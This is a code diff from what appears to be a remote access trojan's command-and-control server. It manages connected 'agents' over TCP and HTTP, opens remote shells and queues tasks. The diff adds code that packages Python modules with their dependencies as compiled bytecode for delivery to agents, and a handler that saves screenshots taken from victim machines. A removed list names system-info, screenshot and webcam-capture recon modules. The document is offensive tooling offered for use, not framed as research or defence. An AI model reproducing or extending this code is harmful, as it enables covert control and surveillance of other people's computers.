@@ -1,10 +1,12 @@
 from core.utils import common, config
-from core.agents.utils import task as taskmng
+from core.agents.utils import task as taskmng, common as agcommon
 from core.transport import tcp, http
 
+import compileall
 from tabulate import tabulate
 from pathlib import Path
 import time
+import os
 
 printer = common.Print_str()
 
@@ -82,23 +84,8 @@ AGENT_COMMANDS = {
 }
 
 MODULE_FOLDER = "core/modules"
-MODULE_FILES = [f.stem for f in Path(MODULE_FOLDER).iterdir() if f.is_file() and f.suffix == ".py"]
-MODULE_LIST = {
-    
-    # === Recon ===
-    "sysinfo": {
-        "msg": "Extract system info",
-        "header": "SYSINFO"
-    },
-    "screenshot": {
-        "msg": "Take a screenshot of the desktop",
-        "header": "SCREENSHOT"
-    },
-    "capture": {
-        "msg": "Stream from webcam (if available)",
-        "header": "WEBCAMCAPTURE"
-    }
-}
+MODULE_FILES = []
+
 
 def tasks(agent_id):
     title = f"Agent {agent_id} tasks"
@@ -118,42 +105,29 @@ def result(agent_id, arg=None):
 
     if arg:
         if arg == "all":
-            title = f"All results for Agent {agent_id}"
-            
+
             tasks = taskmng.get_all_tasks(agent_id)
             if not tasks:
                 return printer.warning(f"No tasks found for agent {agent_id}")
             
             for task in tasks:
                 rows.append([task.id, task.command, task.result_at, task.result])
-            output = tabulate(rows, headers=headers, tablefmt='fancy_grid')
-        elif arg == "raw":
-            task = taskmng.get_earliest_result(agent_id)
-            if not task:
-                return printer.warning("No result has been sent yet")
+            output = tabulate(rows, headers=headers, tablefmt='fancy_grid') + "\n"
             
-            title = "Latest task result"
-            output = task.result
         else:
             task = taskmng.get_task_by_id(agent_id, arg)
             if not task:
                 return printer.warning(f"Task {arg} not found for agent {agent_id}")
-            
-            title = f"Task {task.id} result "
-            headers = ["Command", "Result at", "Result"]
-            rows.append([task.command, task.result_at, task.result])
-            output = tabulate(rows, headers=headers, tablefmt='fancy_grid')
+
+            output = task.result
     else:
         task = taskmng.get_earliest_result(agent_id)
         if not task:
             return printer.warning("No result has been sent yet")
-        
-        title = "Latest task result"
-        rows.append([task.id, task.command, task.result_at, task.result])
-        output = tabulate(rows, headers=headers, tablefmt='fancy_grid')
-        
-    return f"{title}\n{output}\n"
 
+        output = task.result
+        
+    return output
 
 def cmd(agent, cmd, conn_type):
     header = AGENT_COMMANDS.get("cmd")["header"]
@@ -212,24 +186,68 @@ def shell(conn, agent, conn_type):
             
     return f"{printer.task("Closing shell...")}{printer.success(response)}"
 
+def module_maker(module_name):
+    module_path = f"{MODULE_FOLDER}/{module_name}.py"
+    zip_path = f"{MODULE_FOLDER}/{module_name}.zip"
+
+    imports = agcommon.find_non_builtin_imports(module_path)
+    pathes = []
+    for imp in imports:
+        pathes.append(agcommon.find_library_path(imp))
+    pathes.append(agcommon.find_library_path("__future__"))
+    agcommon.zip_modules(pathes, zip_path)
+        
+    with open(zip_path, "rb") as f:
+        zip_bytes = f.read()
+        
+    os.remove(zip_path)
+    
+    compileall.compile_file(module_path, force=True, quiet=1)
+    pyc_path = f'core/modules/__pycache__/{module_name}.cpython-312.pyc'
+    
+    with open(pyc_path,"rb") as f:
+        f.read(16)
+        module = f.read()
+
+    return zip_bytes + b"::::" + module
+
+def module_handler(agent_id, header, conn_type, response=None, task_id=None):
+    if conn_type == "tcp":
+    
+        match header.decode():
+            case "SCREENSHOT":
+                file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
+                common.save_file(response, file_path,True)
+                return printer.success(f"Screenshot saved at {file_path}")
+            case _:
+                return response
+            
+    elif conn_type == "http":
+    
+        match header.decode():
+            case "SCREENSHOT":
+                response = response
+                file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
+                common.save_file(response, file_path,True)
+                return printer.success(f"Screenshot saved at {file_path}").encode()
+            case _:
+                return response
 
 def module(agent, arg, conn_type):
     if not arg:
         return module_help()
     global MODULE_FILES
+
+    MODULE_FILES = [f.stem for f in Path(MODULE_FOLDER).iterdir() if f.is_file() and f.suffix == ".py"]
     
     if not MODULE_FILES:
         return printer.warning("No module available")
     
-    MODULE_FILES = [f.stem for f in Path(MODULE_FOLDER).iterdir() if f.is_file() and f.suffix == ".py"]
-    
     if arg == "list":
-        lines = ["Available Commands:\n"]
+        lines = ["Available Commands:"]
         
-        for cmd, info in AGENT_COMMANDS.items():
-            if cmd in MODULE_FILES:
-                msg = info["msg"] if isinstance(info, dict) else info
-                lines.append(f"  - {cmd:<20} {msg}")
+        for module in MODULE_FILES:
+            lines.append(module)
                 
         return printer.info("\n".join(lines))
 
@@ -238,20 +256,21 @@ def module(agent, arg, conn_type):
     if not module_name in MODULE_FILES:
         return printer.warning("Module not found")
     
-    with open(f"{MODULE_FOLDER}/{module_name}.py","r") as f:
-        module = f.read()
+    module = module_maker(module_name)
 
     header = AGENT_COMMANDS.get("module")["header"]
     
     if conn_type == "tcp":
         tcp.send_data(agent.conn, module, header)
-        _, response = tcp.recv_data(agent.conn)
+        header ,response = tcp.recv_data(agent.conn, binary=True)
+        response = module_handler(agent.id, header, conn_type, response)
         
     elif conn_type == "http":
         task_id = taskmng.add_task(agent.id, module_name, header)
         response = printer.success(f"Task {task_id} added")
 
     return response
+
 
 def exit():
     return printer.signal("Main Menu")
